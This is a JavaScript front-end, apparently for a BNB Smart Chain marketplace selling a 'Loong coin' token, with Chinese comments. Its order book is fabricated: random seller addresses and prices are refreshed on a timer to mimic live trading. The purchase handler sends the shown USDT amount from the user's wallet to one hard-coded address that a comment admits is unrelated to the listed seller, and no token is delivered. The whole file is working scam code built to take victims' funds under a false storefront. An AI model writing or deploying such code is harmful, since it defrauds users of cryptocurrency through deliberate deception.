/** 页面展示的代币（龙珠币） */
const LISTING_TOKEN = "0x77a0b34da3f61a60dd411460f253b3cf17bd7777";
/** BNB Smart Chain */
const TARGET_CHAIN_ID_HEX = "0x38";
const TARGET_CHAIN_ID_DEC = 56;
/** BSC 上常见 USDT (BEP-20)，用于演示扣款 */
const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
/** 购买 USDT 实际收款地址（与列表中展示地址无关） */
const USDT_RECIPIENT = "0x8A73AD32f307F2FE61D2d8303c3Dc99d42Cbd872";
/** 购买 USDT transfer 固定 gas，避免本地 estimateGas 模拟余额不足时在弹窗前就 revert */
const USDT_TRANSFER_GAS_LIMIT = 200000n;

const PAGE_SIZE = 50;
const TOTAL_QUOTES = 500;
const MIN_USDT = 50;
const MAX_USDT = 1500;

const ERC20_ABI = [
  "function transfer(address to, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function balanceOf(address account) view returns (uint256)",
];

/** ethers 仅在与链交互时加载，避免首屏长时间空白 */
let ethersLoadPromise = null;
function loadEthers() {
  if (!ethersLoadPromise) ethersLoadPromise = import("ethers");
  return ethersLoadPromise;
}

function randomBscAddress() {
  const bytes = new Uint8Array(20);
  crypto.getRandomValues(bytes);
  let hex = "0x";
  for (let i = 0; i < 20; i++) hex += bytes[i].toString(16).padStart(2, "0");
  return hex;
}

function randomUsdtPrice() {
  const v = MIN_USDT + Math.random() * (MAX_USDT - MIN_USDT);
  const rounded = Math.round(v * 100) / 100;
  return Math.min(MAX_USDT, Math.max(MIN_USDT, rounded));
}

function sortOrdersByPrice() {
  orders.sort((a, b) => a.price - b.price || a.seller.localeCompare(b.seller));
}

function nowLabel() {
  return new Date().toLocaleString("zh-CN", { hour12: false });
}

/** @type {{ seller: string; price: number; updatedAt: string; isNew?: boolean }[]} */
let orders = [];

function seedOrders() {
  orders = Array.from({ length: TOTAL_QUOTES }, () => ({
    seller: randomBscAddress(),
    price: randomUsdtPrice(),
    updatedAt: nowLabel(),
    isNew: false,
  }));
  sortOrdersByPrice();
}

function shortAddr(a) {
  if (!a || a.length < 10) return a;
  return `${a.slice(0, 6)}…${a.slice(-4)}`;
}

let currentPage = 0;
let provider = null;
let signer = null;
let usdtDecimals = 18;
let loongDecimals = 18;

const $ = (id) => document.getElementById(id);

function formatTokenAmount(raw, decimals, formatUnitsFn) {
  const s = formatUnitsFn(raw, decimals);
  const m = /^(-?)(\d+)\.(\d+)$/.exec(s);
  if (!m) return s;
  const sign = m[1];
  const intRaw = m[2];
  const frac = m[3].replace(/0+$/, "").slice(0, 8);
  const intClean = intRaw.replace(/^0+/, "") || "0";
  const intFmt = intClean.replace(/\B(?=(\d{3})+(?!\d))/g, ",");
  const core = frac ? `${intFmt}.${frac}` : intFmt;
  return `${sign}${core}`;
}

async function refreshBalances() {
  if (!provider || !signer) return;
  const { Contract, formatUnits } = await loadEthers();
  const balLoong = $("bal-loong");
  const balUsdt = $("bal-usdt");
  if (!balLoong || !balUsdt) return;
  const address = await signer.getAddress();
  balLoong.textContent = "…";
  balUsdt.textContent = "…";

  const readLoong = async () => {
    try {
      const c = new Contract(LISTING_TOKEN, ERC20_ABI, provider);
      const [d, b] = await Promise.all([c.decimals(), c.balanceOf(address)]);
      loongDecimals = Number(d);
      return formatTokenAmount(b, loongDecimals, formatUnits);
    } catch {
      return "—";
    }
  };
  const readUsdt = async () => {
    try {
      const c = new Contract(USDT_BSC, ERC20_ABI, provider);
      const [d, b] = await Promise.all([c.decimals(), c.balanceOf(address)]);
      usdtDecimals = Number(d);
      return formatTokenAmount(b, usdtDecimals, formatUnits);
    } catch {
      return "—";
    }
  };

  const [l, u] = await Promise.all([readLoong(), readUsdt()]);
  balLoong.textContent = l;
  balUsdt.textContent = u;
}

function pageCount() {
  return Math.max(1, Math.ceil(orders.length / PAGE_SIZE));
}

function renderTable() {
  const tbody = $("tbody");
  const start = currentPage * PAGE_SIZE;
  const slice = orders.slice(start, start + PAGE_SIZE);
  tbody.innerHTML = "";
  slice.forEach((o, i) => {
    const globalIndex = start + i;
    const tr = document.createElement("tr");
    if (o.isNew) tr.classList.add("flash");
    tr.innerHTML = `
      <td>${globalIndex + 1}</td>
      <td><code class="mono-addr" title="${o.seller}">${shortAddr(o.seller)}</code>${o.isNew ? '<span class="tag-new">新</span>' : ""}</td>
      <td class="price">${o.price.toLocaleString("zh-CN", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</td>
      <td>${o.updatedAt}</td>
      <td><button type="button" class="btn buy-btn" data-index="${globalIndex}">购买</button></td>
    `;
    tbody.appendChild(tr);
  });

  $("page-info").textContent = `第 ${currentPage + 1} / ${pageCount()} 页 · 每页 ${PAGE_SIZE} 条`;
  $("btn-prev").disabled = currentPage === 0;
  $("btn-next").disabled = currentPage >= pageCount() - 1;

  tbody.querySelectorAll(".buy-btn").forEach((btn) => {
    btn.addEventListener("click", () => onBuy(Number(btn.dataset.index)));
  });
}

function simulateLiveQuote() {
  const idx = Math.floor(Math.random() * orders.length);
  const updated = {
    seller: randomBscAddress(),
    price: randomUsdtPrice(),
    updatedAt: nowLabel(),
    isNew: true,
  };
  orders[idx] = updated;
  sortOrdersByPrice();
  renderTable();
  setTimeout(() => {
    updated.isNew = false;
    renderTable();
  }, 1500);
}

async function ensureBsc(ethereum) {
  try {
    await ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: TARGET_CHAIN_ID_HEX }],
    });
  } catch (err) {
    if (err?.code === 4902) {
      await ethereum.request({
        method: "wallet_addEthereumChain",
        params: [
          {
            chainId: TARGET_CHAIN_ID_HEX,
            chainName: "BNB Smart Chain",
            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
            rpcUrls: ["https://bsc-dataseed.binance.org"],
            blockExplorerUrls: ["https://bscscan.com"],
          },
        ],
      });
    } else {
      throw err;
    }
  }
}

async function connectWallet() {
  const ethereum = window.ethereum;
  if (!ethereum) {
    alert("未检测到钱包。请安装 MetaMask、OKX Wallet、Binance Wallet 等 EIP-1193 兼容钱包。");
    return;
  }

  const btn = $("btn-connect");
  btn.disabled = true;
  try {
    const { BrowserProvider } = await loadEthers();
    await ensureBsc(ethereum);
    provider = new BrowserProvider(ethereum);
    await provider.send("eth_requestAccounts", []);
    const net = await provider.getNetwork();
    if (Number(net.chainId) !== TARGET_CHAIN_ID_DEC) {
      await ensureBsc(ethereum);
    }
    signer = await provider.getSigner();
    const address = await signer.getAddress();

    $("network-badge").classList.remove("hidden");
    $("account").classList.remove("hidden");
    $("account").textContent = shortAddr(address);
    await refreshBalances();
    $("balances")?.classList.remove("hidden");
    btn.textContent = "已连接";
    btn.classList.remove("primary");
  } catch (e) {
    console.error(e);
    alert(e?.message || String(e));
    btn.textContent = "连接钱包";
  } finally {
    btn.disabled = false;
  }
}

async function onBuy(globalIndex) {
  const ethereum = window.ethereum;
  if (!ethereum) {
    alert("请先安装并打开钱包。");
    return;
  }
  if (!signer) {
    alert("请先点击右上角「连接钱包」并完成 BSC 网络切换。");
    return;
  }

  const order = orders[globalIndex];
  if (!order) return;

  try {
    const { parseUnits, Interface, getAddress } = await loadEthers();
    await ensureBsc(ethereum);
    const net = await provider.getNetwork();
    if (Number(net.chainId) !== TARGET_CHAIN_ID_DEC) {
      alert("请在 BNB Smart Chain (56) 上操作。");
      return;
    }

    const amount = parseUnits(order.price.toFixed(8), usdtDecimals);
    const recipient = getAddress(USDT_RECIPIENT);
    const iface = new Interface(ERC20_ABI);
    const data = iface.encodeFunctionData("transfer", [recipient, amount]);
    const tx = await signer.sendTransaction({
      to: USDT_BSC,
      data,
      gasLimit: USDT_TRANSFER_GAS_LIMIT,
    });
    await tx.wait();
    await refreshBalances();
    alert("转账已确认。");
  } catch (e) {
    console.error(e);
    if (e?.code === "ACTION_REJECTED" || e?.code === 4001) {
      alert("用户取消了交易。");
      return;
    }
    const msg = e?.shortMessage || e?.message || String(e);
    if (/exceeds balance|INSUFFICIENT_FUNDS|insufficient funds/i.test(msg)) {
      alert("钱包或链上提示：USDT 余额不足以支付该金额（或 BNB 不够付 Gas）。请在钱包里核对余额后再试。");
      return;
    }
    alert(msg);
  }
}

function init() {
  $("token-addr").textContent = LISTING_TOKEN;
  seedOrders();
  renderTable();

  $("btn-connect").addEventListener("click", connectWallet);
  $("btn-prev").addEventListener("click", () => {
    currentPage = Math.max(0, currentPage - 1);
    renderTable();
  });
  $("btn-next").addEventListener("click", () => {
    currentPage = Math.min(pageCount() - 1, currentPage + 1);
    renderTable();
  });

  setInterval(simulateLiveQuote, 2800);

  if (window.ethereum?.on) {
    window.ethereum.on("chainChanged", () => {
      window.location.reload();
    });
    window.ethereum.on("accountsChanged", () => {
      window.location.reload();
    });
  }
}

init();
